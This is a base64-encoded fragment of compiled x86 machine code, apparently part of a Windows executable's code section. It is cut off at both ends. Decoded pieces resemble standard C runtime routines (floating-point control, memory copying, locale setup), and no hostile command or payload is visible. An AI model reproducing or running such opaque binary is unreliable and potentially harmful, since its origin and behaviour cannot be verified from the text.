QPi48AAADdAY1FCFBRUd0cJOjW/f//i0UIg8QMBQD6//+JRQjdVfTZ7j3O+///fQcz/97JR+tX3tkz0t/g9sRBdQFCi0X6uQP8//+D4A+DyBBmiUX6i0UIO8F9KSvIi0X09kX0AXQFhf91AUfR6PZF+AGJRfR0CA0AAACAiUX00W34SXXc3UX0hdJ0Atngi0UM3RjrAzP/R4X/X3QIahDoDAQAAFmD5v32wxB0EfZFECB0C2og6PYDAABZg+bvM8CF9l4PlMBbi+Vdw1WL7GoA/3Uc/3UY/3UU/3UQ/3UM/3UI6AUAAACDxBxdw1WL7ItFCDPJUzPbQ4lIBItFCFe/DQAAwIlICItFCIlIDItNEPbBEHQLi0UIv48AAMAJWAT2wQJ0DItFCL+TAADAg0gEAvbBAXQMi0UIv5EAAMCDSAQE9sEEdAyLRQi/jgAAwINIBAj2wQh0DItFCL+QAADAg0gEEItNCFaLdQyLBsHgBPfQM0EIg+AQMUEIi00IiwYDwPfQM0EIg+AIMUEIi00IiwbR6PfQM0EIg+AEMUEIi00IiwbB6AP30DNBCIPgAjFBCIsGi00IwegF99AzQQgjwzFBCOg/AwAAi9D2wgF0B4tNCINJDBD2wgR0B4tFCINIDAj2wgh0B4tFCINIDAT2whB0B4tFCINIDAL2wiB0BotFCAlYDIsGuQAMAAAjwXQ1PQAEAAB0Ij0ACAAAdAw7wXUpi0UIgwgD6yGLTQiLAYPg/oPIAokB6xKLTQiLAYPg/QvD6/CLRQiDIPyLBrkAAwAAI8F0ID0AAgAAdAw7wXUii0UIgyDj6xqLTQiLAYPg54PIBOsLi00IiwGD4OuDyAiJAYtFCItNFMHhBTMIgeHg/wEAMQiLRQgJWCCDfSAAdCyLRQiDYCDhi0UY2QCLRQjZWBCLRQgJWGCLRQiLXRyDYGDhi0UI2QPZWFDrOotNCItBIIPg44PIAolBIItFGN0Ai0UI3VgQi0UICVhgi00Ii10ci0Fgg+Djg8gCiUFgi0UI3QPdWFDoZgEAAI1FCFBqAWoAV/8V5HBBAItNCPZBCBB0A4Mm/vZBCAh0A4Mm+/ZBCAR0A4Mm9/ZBCAJ0A4Mm7/ZBCAF0A4Mm34sBuv/z//+D4AOD6AB0L0h0Hkh0C0h1KIEOAAwAAOsgiwYl//v//w0ACAAAiQbrEIsGJf/3//8NAAQAAOvuIRaLAcHoAoPgB4PoAHQVSHQHSHUaIRbrFosGI8INAAIAAOsJiwYjwg0AAwAAiQaDfSAAXnQH2UFQ2RvrBd1BUN0bX1tdw1WL7ItFCIP4AXQVg8D+g/gBdxjoGfT//8cAIgAAAF3D6Az0///HACEAAABdw2oIaDDtQQDoOPD//4M9ACNCAAF8W4tFCKhAdEqDPXAGQgAAdEGDZfwAD65VCOsui0XsiwCBOAUAAMB0C4E4HQAAwHQDM8DDM8BAw4tl6IMlcAZCAACDZQi/D65VCMdF/P7////rCoPgv4lFCA+uVQjoFPD//8NVi+xR3X382+IPv0X8i+Vdw1WL7FGb2X38i00Mi0UI99EjRQxmI038ZgvID7fBiUUM2W0MD79F/IvlXcNVi+xRUYtNCPbBAXQK2y1YBkIA210Im/bBCHQQm9/g2y1YBkIA3V34m5vf4PbBEHQK2y1kBkIA3V34m/bBBHQJ2e7Z6N7x3dib9sEgdAbZ691d+JuL5V3DVYvsUZvdffwPv0X8i+Vdw1WL7OgPAAAAg30IAHQF6AFqAADb4l3DuNzMQADHBdgGQgDI1UAAo9QGQgDHBdwGQgBZ1kAAxwXgBkIAs9ZAAMcF5AZCADjXQACj6AZCAMcF7AZCAP3MQADHBfAGQgBx1kAAxwX0BkIA2dVAAMcF+AZCAMTWQADDVYvsi0UIiwCBOGNzbeB1JYN4EAN1H4tAFD0gBZMZdBs9IQWTGXQUPSIFkxl0DT0AQJkBdAYzwF3CBADoB/f//8xo3W1AAOgjGAAAWTPAw1WL7FbonwIAAIvwhfYPhEUBAACLVlyLyleLfQg5OXQNg8EMjYKQAAAAO8hy742CkAAAADvIcwQ5OXQCM8mFyQ+EEAEAAItRCIXSD4QFAQAAg/oFdQyDYQgAM8BA6fYAAACD+gF1CIPI/+npAAAAi0UMU4teYIlGYIN5BAgPhcAAAABqJF+LRlyDZAcIAIPHDIH/kAAAAHztgTmOAADAi35kdQzHRmSDAAAA6YYAAACBOZAAAMB1CcdGZIEAAADrdYE5kQAAwHUJx0ZkhAAAAOtkgTmTAADAdQnHRmSFAAAA61OBOY0AAMB1CcdGZIIAAADrQoE5jwAAwHUJx0ZkhgAAAOsxgTmSAADAdQnHRmSKAAAA6yCBObUCAMB1CcdGZI0AAADrD4E5tAIAwHUHx0ZkjgAAAP92ZGoI/9JZiX5k6wn/cQSDYQgA/9JZiV5gg8j/W+sCM8BfXl3DaghoUO1BAOj97P//i3UIhfYPhP4AAACDfiQAdAn/diTonMX//1mDfiwAdAn/dizojcX//1mDfjQAdAn/djTofsX//1mDfjwAdAn/djzob8X//1mDfkAAdAn/dkDoYMX//1mDfkQAdAn/dkToUcX//1mDfkgAdAn/dkjoQsX//1mBflzggUEAdAn/dlzoMMX//1lqDejm8v//WYNl/ACLTmiFyXQYg8j/8A/BAXUPgfkICUIAdAdR6AXF//9Zx0X8/v///+hXAAAAagzor/L//1nHRfwBAAAAi35shf90I1foniIAAFk7PYwNQgB0FIH/kA1CAHQMgz8AdQdX6CghAABZx0X8/v///+geAAAAVuitxP//Weg07P//wgQAi3UIag3owvP//1nDi3UIagzotvP//1nDVugSAAAAi/CF9nUIahDopM7//1mLxl7DVlf/FeBwQQD/NXwGQgCL+OgoEgAAi/BZhfZ1R2i8AwAAagHosur//4vwWVmF9nQzVv81fAZCAOggEgAAWVmFwHQYagBW6CUAAABZWf8VOHBBAINOBP+JBusJVugUxP//WTP2V/8VzHBBAF+Lxl7DaghoeO1BAOhB6///i3UIx0Zc4IFBAINmCAAz/0eJfhSJfnBqQ1hmiYa4AAAAZomGvgEAAMdGaAgJQgCDprgDAAAAag3oevH//1mDZfwAi0Zoi8/wD8EIx0X8/v///+g+AAAAagzoWfH//1mJffyLRQyJRmyFwHUIoYwNQgCJRmz/dmzoUB8AAFnHRfz+////6BUAAADo+Or//8Mz/0eLdQhqDeiF8v//WcNqDOh88v//WcPoTM7//+g38v//hcB1COhjAAAAM8DDaIdvQADovhAAAKN8BkIAWYP4/3TjVmi8AwAAagHogOn//4vwWVmF9nQtVv81fAZCAOjuEAAAWVmFwHQbagBW6PP+//9ZWf8VOHBBAINOBP+JBjPAQF7D6AQAAAAzwF7DoXwGQgCD+P90DlDodhAAAIMNfAZCAP9Z6bHw//9qZGig7UEA6Pvp//9qC+hq8P//WTPbiV38akBqIF9X6AHp//9ZWYvIiU3chcl1G2r+jUXwUGiQAkIA6GhRAACDxAyDyP/pWwIAAKOoH0IAiT0kJUIABQAIAAA7yHMxZsdBBAAKgwn/iVkIgGEkgIpBJCR/iEEkZsdBJQoKiVk4iFk0g8FAiU3coagfQgDrxo1FjFD/FXBwQQBmg32+AA+ELwEAAItFwIXAD4QkAQAAiwiJTeSDwASJRdgDwYlF4LgACAAAO8h8BYvIiU3kM/ZGiXXQOQ0kJUIAfSBqQFfoQuj//1lZi8iJTdyFyQ+FlAAAAIsNJCVCAIlN5Iv7iX3Uav5bi0XYi1XgO/kPjcUAAACLMoP+/3RbO/N0V4oAqAF0UagIdQ5W/xXIcEEAi1XghcB0PIvHwfgFi/eD5h/B5gYDNIWoH0IAiXXciwKJBotF2IoAiEYEagBooA8AAI1GDFDoYg8AAIPEDP9GCItV4ItN5EeJfdSLRdhAiUXYg8IEiVXg64OJDLWoH0IAAT0kJUIAiwS1qB9CAAUACAAAO8hzJGbHQQQACoMJ/4lZCIBhJIBmx0ElCgqJWTiIWTSDwUCJTdzrzEaJddCLTeTpAP///2r+WzP/iX3Ug/8DD423AAAAi/fB5gYDNagfQgCJddyDPv90EjkedA4PvkYEDICIRgTpjAAAAMZGBIGF/3UFavZY6wqNR//32BvAg8D1UP8VDHFBAIlF5IP4/3RMhcB0SFD/FchwQQCFwHQ9i03kiQ4l/wAAAIP4AnUID75GBAxA6wuD+AN1CQ++RgQMCIhGBGoAaKAPAACNRgxQ6FYOAACDxAz/RgjrGg++RgQMQIhGBIkeoUA1QgCFwHQGiwS4iVgQR+k9////iV386AgAAAAzwOii5///w2oL6DXv//9Zw1WL7FFRU1ZXaAQBAAC7qCBCADPAUzP/ZqOwIkIAV/8V0HBBAIs1SDVCAIkdxBRCAIX2dAVmOT51AovzjUX4UI1F/FBXV1boYwAAAItd/IPEFIH7////P3NLi0X4Pf///39zQY0MWAPAA8k7yHI2UehF5v//i/hZhf90KY1F+FCNRfxQjQSfUFdW6CAAAACLRfyDxBRIiT20FEIAo6wUQgAzwOsDg8j/X15bi+Vdw1WL7FFRi0UUi00Ii1UQU4tdGFaLdQxXM/+JO8cAAQAAAIX2dAiJFoPGBIl1DMdFCCAAAADHRfwJAAAAaiJYZjkBdREzwIX/aiIPlMCDwQKL+FjrGv8DhdJ0CWaLAWaJAoPCAg+3AYPBAmaFwHQchf91yWY7RQh0BmY7Rfx1vYXSdAszwGaJQv7rA4PpAot9GDPbiV34ZjkZD4TfAAAAD7cBZjtFCHQGZjtF/HUFg8EC6+xmORkPhMIAAACF9nQIiRaDxgSJdQyLRRSLdfj/AGpcx0X4AQAAAFjrBIPBAkNmOQF092oiWGY5AWpcWHU79sMBdSWF9nQRaiJfZjl5Aot9GHUFg8EC6w2DZfgAM8CF9g+UwIvwalxY0evrDUuF0nQGZokCg8IC/weF23XvD7cBZoXAdCyF9nUMZjtFCHQiZjtF/HQcg334AHQMhdJ0BmaJAoPCAv8Hg8ECM9vpbf///4l1+It1DIXSdAgzwGaJAoPCAv8HM9vpGP///4X2dAKJHotFFF9eW/8Ai+Vdw1NWizWgFEIAM9tXi/uF9nUbg8j/6aEAAABmO8F0AUdW6KgfAABZjTRGg8YCD7cGaj1ZZoXAdeKNRwFqBFDo8uP//4v4iT28FEIAWVmF/3TBizWgFEIAZjkedERW6GwfAABZaj2NWAFYZjkGdCJqAlPov+P//4kHWVmFwHRBVlNQ6Fu8//+DxAyFwHVJg8cEjTReM9tmOR51wos1oBRCAFboKb3//4kdoBRCADPAiR/HBTglQgABAAAAWV9eW8P/NbwUQgDoBb3//4MlvBRCAACDyP/r5DPAUFBQUFDoluf//8xVi+yLRQijGBhCAF3DVYvsi0UIhcB4IYP4An4Ng/gDdReLDbQiQgDrC4sNtCJCAKO0IkIAi8Fdw+i35///xwAWAAAA6D3n//+DyP9dw1WL7IPsFINl9ACDZfgAoZACQgBWV79O5kC7vgAA//87x3QNhcZ0CffQo5QCQgDrZo1F9FD/FcBwQQCLRfgzRfSJRfz/FThwQQAxRfz/FTxwQQAxRfyNRexQ/xXEcEEAi03wjUX8M03sM038M8g7z3UHuU/mQLvrEIXOdQyLwQ0RRwAAweAQC8iJDZACQgD30YkNlAJCAF9ei+Vdw1ZXvvzqQQC//OpBAOsLiwaFwHQC/9CDxgQ793LxX17DVle+BOtBAL8E60EA6wuLBoXAdAL/0IPGBDv3cvFfXsNVi+xRV/8VvHBBAIv4hf90R1Mz21aL92Y5H3QQg8YCZjkedfiDxgJmOR518Cv3g8YCVug64v//iUX8WYXAdA5WV1DoxAIAAItd/IPEDFf/FbhwQQBei8NbX4vlXcNVi+yLVQyhwAZCAPfSi00II9AjTQwL0YkVwAZCAF3D6PoNAACFwHQIahboGA4AAFn2BcAGQgACdCFqF+hWmgAAhcB0BWoHWc0pagFoFQAAQGoD6Evk//+DxAxqA+jwxf//zFWL7ItFCKO4IkIAXcNqEGjA7UEA6DPi//8z/4l95GoB6J3o//9ZIX38agNeiXXgOzVENUIAfVOhQDVCAIsEsIXAdET2QAyDdBBQ6KxeAABZg/j/dARHiX3kg/4UfCmhQDVCAIsEsIPAIFD/FdRwQQChQDVCAP80sOiHuv//WaFANUIAgySwAEbrosdF/P7////oCwAAAIvH6PTh///Di33kagHohOn//1nDagho4O1BAOiW4f//i30Ii8fB+AWL94PmH8HmBgM0hagfQgAz2zleCHUxagro5+f//1mJXfw5Xgh1FVNooA8AAI1GDFDoGwgAAIPEDP9GCMdF/P7////oKgAAAIvHwfgFg+cfwecGiwSFqB9CAIPADAPHUP8VSHFBADPAQOhm4f//w4t9CGoK6Pbo//9Zw1WL7ItFCFZXhcB4YDsFJCVCAHNYi/iL8MH/BYPmH8HmBosMvagfQgD2RA4EAXQ9gzwO/3Q3gz0YGEIAAXUfM8krwXQQSHQISHUTUWr06whRavXrA1Fq9v8VtHBBAIsEvagfQgCDDAb/M8DrFuhj5P//xwAJAAAA6CTk//+DIACDyP9fXl3DVYvsi00Ig/n+dRXoCuT//4MgAOg25P//xwAJAAAA60KFyXgmOw0kJUIAcx6LwYPhH8H4BcHhBosEhagfQgD2RAgEAXQFiwQIXcPoy+P//4MgAOj34///xwAJAAAA6H3j//+DyP9dw1WL7ItNCIvBwfgFg+EfweEGg8EMiwSFqB9CAAPBUP8VRHFBAF3DzFdWi3QkEItMJBSLfCQMi8GL0QPGO/52CDv4D4JoAwAAD7olBCNCAAFzB/Ok6RcDAACB+YAAAAAPgs4BAACLxzPGqQ8AAAB1Dg+6JVAOQgABD4LaBAAAD7olBCNCAAAPg6cBAAD3xwMAAAAPhbgBAAD3xgMAAAAPhZcBAAAPuucCcw2LBoPpBI12BIkHjX8ED7rnA3MR8w9+DoPpCI12CGYP1g+Nfwj3xgcAAAB0Yw+65gMPg7IAAABmD29O9I129GYPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QxmD38fZg9v4GYPOg/CDGYPf0cQZg9vzWYPOg/sDGYPf28gjX8wfbeNdgzprwAAAGYPb074jXb4jUkAZg9vXhCD6TBmD29GIGYPb24wjXYwg/kwZg9v02YPOg/ZCGYPfx9mD2/gZg86D8IIZg9/RxBmD2/NZg86D+wIZg9/byCNfzB9t412COtWZg9vTvyNdvyL/2YPb14Qg+kwZg9vRiBmD29uMI12MIP5MGYPb9NmDzoP2QRmD38fZg9v4GYPOg/CBGYPf0cQZg9vzWYPOg/sBGYPf28gjX8wfbeNdgSD+RB8E/MPbw6D6RCNdhBmD38PjX8Q6+gPuuECcw2LBoPpBI12BIkHjX8ED7rhA3MR8w9+DoPpCI12CGYP1g+NfwiLBI3If0AA/+D3xwMAAAB1FcHpAoPiA4P5CHIq86X/JJXIf0AAkIvHugMAAACD6QRyDIPgAwPI/ySF3H5AAP8kjdh/QACQ/ySNXH9AAJDsfkAAGH9AADx/QAAj0YoGiAeKRgGIRwGKRgLB6QKIRwKDxgODxwOD+QhyzPOl/ySVyH9AAI1JACPRigaIB4pGAcHpAohHAYPGAoPHAoP5CHKm86X/JJXIf0AAkCPRigaIB4PGAcHpAoPHAYP5CHKI86X/JJXIf0AAjUkAv39AAKx/QACkf0AAnH9AAJR/QACMf0AAhH9AAHx/QACLRI7kiUSP5ItEjuiJRI/oi0SO7IlEj+yLRI7wiUSP8ItEjvSJRI/0i0SO+IlEj/iLRI78iUSP/I0EjQAAAAAD8AP4/ySVyH9AAIv/2H9AAOB/QADsf0AAAIBAAItEJAxeX8OQigaIB4tEJAxeX8OQigaIB4pGAYhHAYtEJAxeX8ONSQCKBogHikYBiEcBikYCiEcCi0QkDF5fw5CNdDH8jXw5/PfHAwAAAHUkwekCg+IDg/kIcg3986X8/ySVZIFAAIv/99n/JI0UgUAAjUkAi8e6AwAAAIP5BHIMg+ADK8j/JIVogEAA/ySNZIFAAJB4gEAAnIBAAMSAQACKRgMj0YhHA4PuAcHpAoPvAYP5CHKy/fOl/P8klWSBQACNSQCKRgMj0YhHA4pGAsHpAohHAoPuAoPvAoP5CHKI/fOl/P8klWSBQACQikYDI9GIRwOKRgKIRwKKRgHB6QKIRwGD7gOD7wOD+QgPglb////986X8/ySVZIFAAI1JABiBQAAggUAAKIFAADCBQAA4gUAAQIFAAEiBQABbgUAAi0SOHIlEjxyLRI4YiUSPGItEjhSJRI8Ui0SOEIlEjxCLRI4MiUSPDItEjgiJRI8Ii0SOBIlEjwSNBI0AAAAAA/AD+P8klWSBQACL/3SBQAB8gUAAjIFAAKCBQACLRCQMXl/DkIpGA4hHA4tEJAxeX8ONSQCKRgOIRwOKRgKIRwKLRCQMXl/DkIpGA4hHA4pGAohHAopGAYhHAYtEJAxeX8ONpCQAAAAAV4vGg+APhcAPhdIAAACL0YPhf8HqB3RljaQkAAAAAJBmD28GZg9vThBmD29WIGYPb14wZg9/B2YPf08QZg9/VyBmD39fMGYPb2ZAZg9vblBmD292YGYPb35wZg9/Z0BmD39vUGYPf3dgZg9/f3CNtoAAAACNv4AAAABKdaOFyXRPi9HB6gSF0nQXjZsAAAAAZg9vBmYPfweNdhCNfxBKde+D4Q90KovBwekCdA2LFokXjXYEjX8ESXXzi8iD4QN0D4oGiAdGR0l1942bAAAAAFheX8ONpCQAAAAA6wPMzMy6EAAAACvQK8pRi8KLyIPhA3QJihaIF0ZHSXX3wegCdA2LFokXjXYEjX8ESHXzWen6/v//VYvsoaAkQgAzBZACQgB0B/91CP/QXcNd/yWocEEAVYvsoaQkQgAzBZACQgD/dQh0BP/QXcP/FZxwQQBdw1WL7KGoJEIAMwWQAkIA/3UIdAT/0F3D/xWkcEEAXcNVi+yhrCRCADMFkAJCAP91DP91CHQE/9Bdw/8VoHBBAF3DVYvsobAkQgAzBZACQgB0Df91EP91DP91CP/QXcP/dQz/dQj/FexwQQAzwEBdw1WL7FFWizXQBkIAhfZ5JaEUJUIAM/YzBZACQgCJdfx0DVaNTfxR/9CD+Hp1AUaJNdAGQgAzwIX2Xg+fwIvlXcNWV2iM5EEA/xVQcEEAizUwcEEAi/hogIJBAFf/1jMFkAJCAGiMgkEAV6OgJEIA/9YzBZACQgBolIJBAFejpCRCAP/WMwWQAkIAaKCCQQBXo6gkQgD/1jMFkAJCAGisgkEAV6OsJEIA/9YzBZACQgBoyIJBAFejsCRCAP/WMwWQAkIAaNiCQQBXo7QkQgD/1jMFkAJCAGjsgkEAV6O4JEIA/9YzBZACQgBoBINBAFejvCRCAP/WMwWQAkIAaByDQQBXo8AkQgD/1jMFkAJCAGgwg0EAV6PEJEIA/9YzBZACQgBoUINBAFejyCRCAP/WMwWQAkIAaGiDQQBXo8wkQgD/1jMFkAJCAGiAg0EAV6PQJEIA/9YzBZACQgBolINBAFej1CRCAP/WMwWQAkIAo9gkQgBoqINBAFf/1jMFkAJCAGjEg0EAV6PcJEIA/9YzBZACQgBo5INBAFej4CRCAP/WMwWQAkIAaACEQQBXo+QkQgD/1jMFkAJCAGgghEEAV6PoJEIA/9YzBZACQgBoNIRBAFej7CRCAP/WMwWQAkIAaFCEQQBXo/AkQgD/1jMFkAJCAGhkhEEAV6P4JEIA/9YzBZACQgBodIRBAFej9CRCAP/WMwWQAkIAaISEQQBXo/wkQgD/1jMFkAJCAGiUhEEAV6MAJUIA/9YzBZACQgBopIRBAFejBCVCAP/WMwWQAkIAaMCEQQBXowglQgD/1jMFkAJCAGjUhEEAV6MMJUIA/9YzBZACQgBo5IRBAFejECVCAP/WMwWQAkIAaPiEQQBXoxQlQgD/1jMFkAJCAKMYJUIAaAiFQQBX/9YzBZACQgBoKIVBAFejHCVCAP/WMwWQAkIAX6MgJUIAXsNVi+z/dQj/FUxwQQBdw1WL7P91CP8V9HBBAF3DVYvs/3UI/xUocEEAUP8VrHBBAF3DVYvsagD/FUxwQQD/dQj/FbBwQQBdw8zMzMzMzMzMzMzMzMzMVYvsi0UIM9JTVleLSDwDyA+3QRQPt1kGg8AYA8GF23Qbi30Mi3AMO/5yCYtICAPOO/lyCkKDwCg703LoM8BfXltdw8zMzMzMzMzMzMzMzMxVi+xq/mgA7kEAaPBcQABkoQAAAABQg+wIU1ZXoZACQgAxRfgzxVCNRfBkowAAAACJZejHRfwAAAAAaAAAQADofAAAAIPEBIXAdFSLRQgtAABAAFBoAABAAOhS////g8QIhcB0OotAJMHoH/fQg+ABx0X8/v///4tN8GSJDQAAAABZX15bi+Vdw4tF7IsAM8mBOAUAAMAPlMGLwcOLZejHRfz+////M8CLTfBkiQ0AAAAAWV9eW4vlXcPMzMzMzMxVi+yLRQi5TVoAAGY5CHQEM8Bdw4tIPAPIM8CBOVBFAAB1DLoLAQAAZjlRGA+UwF3DVjP2/7bUBkIA/xVAcUEAiYbUBkIAg8YEg/4ocuZew/81yCJCAP8V2HBBAMNVi+yLRQijwCJCAKPEIkIAo8giQgCjzCJCAF3DaiRoIO5BAOhb1P//g2XUAINl0AAz24ld4DP/iX3Yi3UIg/4Lf1B0FYvGagJZK8F0IivBdAgrwXReK8F1SOhp6P//i/iJfdiF/3UWg8j/6WIBAADHReTAIkIAocAiQgDrXv93XFboUQEAAFlZg8AIiUXkiwDrVovGg+gPdDaD6AZ0I0h0Euid1///xwAWAAAA6CPX///rtMdF5MgiQgChyCJCAOsax0XkxCJCAKHEIkIA6wzHReTMIkIAocwiQgAz20OJXeBQ/xXYcEEAiUXcg/gBD4TbAAAAhcB1B2oD6Ce3//+F23QIagDo79n//1mDZfwAg/4IdAqD/gt0BYP+BHUci0dgiUXUg2dgAIP+CHU/i0dkiUXQx0dkjAAAAIP+CHUtiw14gkEAi9GJVcyhfIJBAAPBO9B9JGvKDItHXINkCAgAQolVzIsNeIJBAOveagD/FUBxQQCLTeSJAcdF/P7////oGAAAAIP+CHUg/3dkVv9V3FnrGot1CItd4It92IXbdAhqAOi72v//WcNW/1XcWYP+CHQKg/4LdAWD/gR1EYtF1IlHYIP+CHUGi0XQiUdkM8Do8tL//8NVi+yLVQyLDXCCQQBWi3UIOXIEdA1rwQyDwgwDRQw70HLua8kMA00MO9FzCTlyBHUEi8LrAjPAXl3DVYvsi0UIo9QiQgBdw4M9NCVCAAB1Emr96E0DAABZxwU0JUIAAQAAADPAw1WL7ItFCC2kAwAAdCaD6AR0GoPoDXQOSHQEM8Bdw6FQhUEAXcOhTIVBAF3DoUiFQQBdw6FEhUEAXcNVi+yD7BCNTfBqAOiZt///gyXwIkIAAItFCIP4/nUSxwXwIkIAAQAAAP8VkHBBAOssg/j9dRLHBfAiQgABAAAA/xWUcEEA6xWD+Px1EItF8McF8CJCAAEAAACLQASAffwAdAeLTfiDYXD9i+Vdw1WL7FOLXQhWV2gBAQAAM/+NcxhXVujlzP//iXsEM8CJewiDxAyJuxwCAAC5AQEAAI17DKurq78ICUIAK/uKBDeIBkZJdfeNixkBAAC6AAEAAIoEOYgBQUp1919eW13DVYvsgewgBQAAoZACQgAzxYlF/FNWi3UIjYXo+v//V1D/dgT/FYxwQQAz278AAQAAhcAPhPAAAACLw4iEBfz+//9AO8dy9IqF7vr//42N7vr//8aF/P7//yDrHw+2UQEPtsDrDTvHcw3GhAX8/v//IEA7wnbvg8ECigGEwHXdU/92BI2F/Pr//1BXjYX8/v//UGoBU+gYUQAAU/92BI2F/P3//1dQV42F/P7//1BX/7YcAgAAU+i5TwAAg8RAjYX8/P//U/92BFdQV42F/P7//1BoAAIAAP+2HAIAAFPokU8AAIPEJIvLD7eETfz6//+oAXQOgEwOGRCKhA38/f//6xCoAnQVgEwOGSCKhA38/P//iIQOGQEAAOsHiJwOGQEAAEE7z3LB61lqn42WGQEAAIvLWCvCiYXg+v//A9EDwomF5Pr//4PAIIP4GXcKgEwOGRCNQSDrE4O95Pr//xl3Do0EDoBIGSCNQeCIAusCiBqLheD6//+NlhkBAABBO89yuotN/F9eM81b6MWl//+L5V3DagxoQO5BAOiiz///M/aJdeToxOP//4v4iw1IDkIAhU9wdBw5d2x0F4t3aIX2dQhqIOhbsv//WYvG6LXP///Dag3o3tX//1mJdfyLd2iJdeQ7NSwLQgB0NIX2dBiDyP/wD8EGdQ+B/ggJQgB0B1bo86f//1mhLAtCAIlHaIs1LAtCAIl15DPAQPAPwQbHRfz+////6AUAAADrkYt15GoN6OrW//9Zw2oQaGDuQQDo/M7//4PP/+gg4///i9iJXeDoPP///4tzaP91COjS/P//WYlFCDtGBA+EaAEAAGggAgAA6C7O//9Zi9iF2w+EVQEAALmIAAAAi0Xgi3Boi/vzpTP2iTNT/3UI6EEBAABZWYv4iX0Ihf8PhQcBAACLReCLSGiDyv/wD8ERdRWLSGiB+QgJQgB0ClHoKqf//1mLReCJWGgzwEDwD8EDi0Xg9kBwAg+F7wAAAPYFSA5CAAEPheIAAABqDei51P//WYl1/ItDBKPYIkIAi0MIo9wiQgCLgxwCAACj7CJCAIvOiU3kg/kFfRBmi0RLDGaJBE3gIkIAQevoi86JTeSB+QEBAAB9DYpEGRiIgQAHQgBB6+iJdeSB/gABAAB9EIqEHhkBAACIhggIQgBG6+WhLAtCAIPJ//APwQh1E6EsC0IAPQgJQgB0B1Dobab//1mJHSwLQgAzwEDwD8EDx0X8/v///+gFAAAA6zGLfQhqDehv1f//WcPrI4P//3UegfsICUIAdAdT6DCm//9Z6DLR///HABYAAADrAjP/i8fops3//8NVi+yD7CChkAJCADPFiUX8U1b/dQiLdQzoNvv//4vYWYXbdQ5W6Jf7//9ZM8DpqQEAAFcz/4vPi8eJTeQ5mDALQgAPhOgAAABBg8AwiU3kPfAAAABy5oH76P0AAA+ExgAAAIH76f0AAA+EugAAAA+3w1D/FZhwQQCFwA+EqAAAAI1F6FBT/xWMcEEAhcAPhIIAAABoAQEAAI1GGFdQ6B7I//+JXgSDxAwz24m+HAIAAEM5Xeh2T4B97gCNRe50IYpIAYTJdBoPttEPtgjrBoBMDhkEQTvKdvaDwAKAOAB1341GGrn+AAAAgAgIQEl1+f92BOgi+v//g8QEiYYcAgAAiV4I6wOJfggzwI1+DKurq+m8AAAAOT3wIkIAdAtW6J76///prwAAAIPI/+mqAAAAaAEBAACNRhhXUOiBx///g8QMa0XkMIlF4I2AQAtCAIlF5IA4AIvIdDWKQQGEwHQrD7YRD7bA6xeB+gABAABzE4qHKAtCAAhEFhlCD7ZBATvQduWDwQKAOQB1zotF5EeDwAiJReSD/wRyuFOJXgTHRggBAAAA6G/5//+DxASJhhwCAACLReCNTgxqBo2QNAtCAF9miwKNUgJmiQGNSQJPdfFW6En6//9ZM8Bfi038XjPNW+iMof//i+Vdw1WL7ItVCDPJU1ZBV4vB8A/BAotyeIX2dAaLwfAPwQaLsoAAAACF9nQGi8HwD8EGi3J8hfZ0BovB8A/BBouyiAAAAIX2dAaLwfAPwQZqBo1yHFuBfvgkDEIAdAyLPoX/dAaLwfAPwQeDfvQAdA2LfvyF/3QGi8HwD8EHg8YQS3XSi4KcAAAABbAAAADwD8EIQV9eW13DVYvsU1aLdQgz21eLhoQAAACFwHRmPXAOQgB0X4tGeIXAdFg5GHVUi4aAAAAAhcB0FzkYdRNQ6F2j////toQAAADoS0sAAFlZi0Z8hcB0FzkYdRNQ6D+j////toQAAADoKUwAAFlZ/3Z46Cqj////toQAAADoH6P//1lZi4aIAAAAhcB0RDkYdUCLhowAAAAt/gAAAFDo/qL//4uGlAAAAL+AAAAAK8dQ6Oui//+LhpgAAAArx1Do3aL///+2iAAAAOjSov//g8QQi4acAAAAPSgMQgB0GzmYsAAAAHUTUOgQTAAA/7acAAAA6Kmi//9ZWWoGWI2eoAAAAIlFCI1+HIF/+CQMQgB0HYsHhcB0FIM4AHUPUOh+ov///zPod6L//1lZi0UIg3/0AHQWi0f8hcB0DIM4AHUHUOhaov//WYtFCIPDBIPHEEiJRQh1slboRKL//1lfXltdw1WL7ItVCIXSD4SOAAAAU1aDzv9Xi8bwD8ECi0p4hcl0BovG8A/BAYuKgAAAAIXJdAaLxvAPwQGLSnyFyXQGi8bwD8EBi4qIAAAAhcl0BovG8A/BAWoGjUocW4F5+CQMQgB0DIs5hf90BovG8A/BB4N59AB0DYt5/IX/dAaLxvAPwQeDwRBLddKLipwAAACBwbAAAADwD8ExTl9eW4vCXcNqDGiA7kEA6NrI//+DZeQA6P3c//+L8IsNSA5CAIVOcHQig35sAHQc6OXc//+LcGyF9nUIaiDojqv//1mLxujoyP//w2oM6BHP//9Zg2X8AP81jA1CAI1GbFDoIQAAAFlZi/CJdeTHRfz+////6AUAAADrvIt15GoM6EjQ//9Zw1WL7FeLfQyF/3Q7i0UIhcB0NFaLMDv3dChXiTjo0Pz//1mF9nQbVui0/v//gz4AWXUPgf6QDUIAdAdW6Eb9//9Zi8de6wIzwF9dw1WL7Lj//wAAg+wUZjlFCA+EmAAAAFb/dQyNTezolq3//4t17IuGqAAAAIXAdRWLTQiNQb9mg/gZdwRmg8EgD7fB6x66AAEAAGoBZjlVCHMo/3UI6KsAAABZhcCLRQhZdQgPt8APt8DrKg+3yIuGlAAAAA+2BAjrG41N/FFqAY1NCFFSUOglDgAAg8QYhcB1C4tFCA+3wA+3wOsED7dF/IB9+ABedAeLTfSDYXD9i+Vdw2oIaKDuQQDoXsf//76QDUIAOTWMDUIAdCpqDOjAzf//WYNl/ABWaIwNQgDo1P7//1lZo4wNQgDHRfz+////6AYAAADoZ8f//8NqDOj6zv//WcNVi+xRZotFCLn//wAAZjvBdQQzwOs8uQABAABmO8FzDg+3yKHIDkIAD7cESOscjUX8UGoBjUUIUGoB/xWIcEEA99gbwCNF/A+3wItNDA+3ySPBi+Vdw1WL7IMlACNCAACD7BxTM9tDCR1QDkIAagrojH4AAIXAD4RMAQAAM8mJHQAjQgAzwA+iVos1UA5CAFeNfeSDzgKJB4lfBIlPCIlXDItF5ItN8IlF9IHxaW5lSYtF7DVudGVsiTVQDkIAC8iLReg1R2VudQvI99lqARrJWP7BagBZD6KJB4lfBIlPCIlXDItN7IlN+HRDi0XkJfA//w89wAYBAHQjPWAGAgB0HD1wBgIAdBU9UAYDAHQOPWAGAwB0Bz1wBgMAdRGLPQQjQgCDzwGJPQQjQgDrBos9BCNCAIN99Ad8NWoHM8mNdeRYD6KJBovGizVQDkIAiVgEiUgIi